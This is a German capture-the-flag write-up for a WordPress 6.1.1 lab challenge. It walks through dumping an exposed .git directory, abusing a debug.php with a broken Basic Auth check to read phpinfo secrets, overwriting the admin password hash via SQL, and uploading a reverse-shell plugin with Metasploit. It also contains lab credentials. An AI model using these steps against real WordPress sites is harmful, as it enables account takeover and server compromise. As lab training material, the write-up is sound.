Wordpress 6.1.1

DBUser: wordpress
Pass: flag{debug_s3cr3ts::GEazwtfP1cxJ}
.git/config
```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
	email = security-summit@hackhigh.edu
	name = Server
```

Da es ein .git Verzeichnis gibt, kann man mit dem githacker eine Version der Webseite herunterladen.

debug.php
```
<?php

if (!isset($_SERVER['PHP_AUTH_USER'])) {
        header('WWW-Authenticate: Basic realm="Wordpress Debug"');
        header('HTTP/1.0 401 Unauthorized');
        print('Unauthorized');
        exit();
} else if ($_SERVER['PHP_AUTH_USER'] !== 'debug' && $_SERVER['PHP_AUTH_PW'] !== 'TJF2cOkR96SGiAGeBFKxna1wEh') {
        header('WWW-Authenticate: Basic realm="Wordpress Debug"');
        header('HTTP/1.0 401 Unauthorized');
        print('Wrong password');
        exit();
}

phpinfo();
```

phpinfo gibt die erste Flag (und das DB-Passwort) in der ENV-Variable: WP_DB_PASSWORD
in der `wp-config.php` steht die Datenbank wordpress und der user wordpress für die mysql-Datenbank.

In der Tabelle `wp-users` finden wir den Nutzer
`sec-admin  | $P$BIAeHZoRw7af/OBbFHbG5kwVtnVoxp1`

Neues Passwort setzen:
`UPDATE `wp_users` SET `user_pass` = '$P$BzuizlISucg33Mee8f/kQZ4dXR2VbI0' WHERE user_login = 'sec-admin'`

Nachdem man das Passwort gesetzt hat kann man sich als admin an Wordpress anmelden.
Mit Meterpreter und dem Plugin `exploit/unix/webapp/wp_admin_shell_upload` lässt sich ein Plugin hochladen, welches eine Reverse-Shell enthält. 
Auf dem System liegt die Flagge unter `/flag/here_you_go`
